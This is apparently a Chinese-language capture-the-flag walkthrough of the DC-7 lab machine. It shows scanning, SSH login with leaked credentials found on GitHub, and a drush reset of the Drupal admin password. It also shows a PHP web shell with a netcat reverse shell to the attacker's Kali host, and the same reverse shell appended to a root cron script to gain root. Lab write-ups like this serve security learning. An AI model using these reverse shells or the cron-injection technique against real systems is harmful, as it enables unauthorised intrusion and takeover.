# DC-7

> kali的ip：192.168.56.101

## 主机扫描

```
arp-scan -l
nmap -sP 192.168.56.0/24
netdiscover -i eth0 -r 192.168.56.102/24 -i指定网卡 -r指定网段
```

靶机ip：192.168.56.106

## 端口扫描

```
nmap -A 192.168.56.106
```

开放了80，22端口

## 目录扫描

```
dirsearch -u http://192.168.56.106
```

有robots.txt，看来一下其实也没有什么东西

## 漏洞发现

### 社工发现登录账户

github上搜索Dc7User

查看配置文件，得到账户密码

```
账户名：dc7user
密码：MdR3xOgB7#dW
数据库名：Staff
```

登录不是web后台，那就试试ssh连接，发现可以连接上

```
ssh dc7user@192.168.56.106
```

家目录里有

```
dc7user@dc-7:~$ ls
backups  mbox
```

一个backups文件夹，mbox文件

看一下mbox内容

```
Subject: Cron <root@dc-7> /opt/scripts/backups.sh
```

这有一个脚本文件，猜测可能是定时任务

看一下权限

```bash
dc7user@dc-7:~$ ls -al /opt/scripts/backups.sh
-rwxrwxr-x 1 root www-data 630 Mar  7 16:18 /opt/scripts/backups.sh
```

www-data有读，写，执行的权限

> 这里有个思路:
>
> 得到www-data权限，往backups.sh写shell，当root执行时，就可以返回root的shell

我这里先看一下，当前用户有什么可以利用的点吗

```bash
dc7user@dc-7:~$ find / -type f -perm -4000 2>/dev/null
/bin/su
/bin/ping
/bin/umount
/bin/mount
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgrp
```

还有exim4文件

发现还是4.89版本

```bash
dc7user@dc-7:~$ /usr/sbin/exim4 --version
Exim version 4.89 #2 built 20-Jul-2019 11:32:35
```

继续尝试一下dc8的脚本，发现并不能提权，这里我就不截图了

那我们就继续上面的思路

又找到一个文件夹

```bash
dc7user@dc-7:~$ cd .drush/
dc7user@dc-7:~/.drush$ ls
cache  drush.bashrc  drush.complete.sh  drush.prompt.sh  drushrc.ph
```

好像跟drush相关，百度一下吧

drush是drupal的一个管理工具

**drush 常用命令**

```
drush user-password admin --password="new_pass" 修改密码
drush upwd root --password="" 修改密码
drush user-information admin 查看用户信息
```

尝试查看admin用户信息，失败

进入到web目录，发现密码修改成功

```bash
dc7user@dc-7:~/.drush$ drush user-information admin                                                         Command user-information needs a higher bootstrap level to run - you will need to invoke drush from a more functional Drupal environment to run this command.  [error]      
dc7user@dc-7:~/.drush$ cd /var/www/html                                                                     dc7user@dc-7:/var/www/html$ drush user-information admin                                                     User ID       :  1                                                                                           User name     :  admin                                                                                       User mail     :  admin@example.com                                                                           User roles    :  authenticated                                                                             administrator                                                                                               User status   :  1                                                         
dc7user@dc-7:/var/www/html$ drush upwd admin --password='123456'                                            
Changed password for admin                                   [success]
```

接下来，我们就可以登录网站了

### 登录web后台

发现可以编写网站文章，直接写php代码拿shell就行了，但Drupal 8不支持PHP代码，百度后知道Drupal 8后为了安全，需要将php单独作为一个模块导入

```
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
```

### 反弹shell

直接写入shell

```
<?php system("nc 192.168.56.101 9001 -e /bin/bash");?>
```

反弹到kali，得到www-data用户

## 提权

再将shell写入backups.sh

```
echo 'nc -e /bin/bash 192.168.56.101 1234' >> backups.sh
```

监听1234端口

之后等待定时任务执行就行

![image-20240307193855462](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240307193855462.png)

## 总结

> drush是Drupal的命令行shell和Unix脚本接口，用于管理drupal网站
>
> 靶机相关知识点:
>
> github社工找源码，crontab的东西

